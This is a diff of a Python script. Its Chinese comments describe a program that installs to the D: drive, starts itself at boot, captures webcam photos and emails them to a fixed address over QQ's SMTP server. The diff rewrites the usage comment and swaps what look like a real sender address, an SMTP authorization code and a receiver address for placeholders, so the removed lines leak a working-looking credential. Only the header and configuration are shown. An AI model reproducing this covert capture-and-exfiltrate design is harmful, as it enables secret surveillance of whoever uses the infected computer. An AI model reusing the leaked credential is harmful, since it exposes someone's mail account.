@@ -1,7 +1,6 @@
 '''
 本文件设计于获取开机后的照片
-流程:复制到电脑后打开软件,然后会收到测试邮件,下次开机后将自动打开该软件,并获取照片
-发送到指定邮箱
+流程:复制到电脑后的D盘根目录后打开软件,然后会收到测试邮件,下次开机后将自动打开该软件,并获取照片发送到指定邮箱
 '''
 
 import cv2
@@ -18,9 +17,9 @@ from email.mime.multipart import MIMEMultipart
 
 host = "smtp.qq.com"    #发服务器接口
 port = 25               #端口号
-sender = "belingbeling@foxmail.com" #消息发送方
-pwd = "hijkpuzgarjlbaih"   #授权码
-receiver = "1711396802@qq.com"  #消息接收方
+sender = "xxxxxxxx@qq.com" #消息发送方
+pwd = "xxxxxxxx"   #授权码
+receiver = "xxxxx@qq.com"  #消息接收方
 exit_count = 5     #尝试联网次数
 # path = os.getcwd()  #获取图片保存路径  返回当前进程的工作目录
 path = "D:"       #文件路径
